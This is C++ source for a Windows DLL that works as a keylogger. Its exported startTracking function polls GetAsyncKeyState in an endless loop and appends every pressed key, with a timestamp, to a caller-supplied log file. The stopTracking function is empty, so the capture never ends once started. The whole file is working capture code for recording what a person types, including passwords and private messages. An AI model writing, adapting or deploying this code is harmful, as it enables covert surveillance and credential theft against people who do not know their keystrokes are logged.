// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"

#include <fstream>
#include <iostream>
#include <ctime>

#pragma comment(linker, "/def:dll.def")

using namespace std;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


int SaveToFile(int Key_Stroke, char *file) {
	fstream myfile;
	myfile.open(file, ios::out | ios::app);

	time_t ctt = time(0);
	char curTime[100];
	tm time;
	localtime_s(&time, &ctt);
	asctime_s(curTime, 100, &time);

	myfile << Key_Stroke << " " << curTime;

	myfile.close();
	return 0;
}


extern "C" __declspec(dllexport) void __stdcall startTracking(char *path) {
	char key;
	while (true) {
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				SaveToFile(key, path);
			}
		}
	}
}


extern "C" __declspec(dllexport) void __stdcall stopTracking() {

}

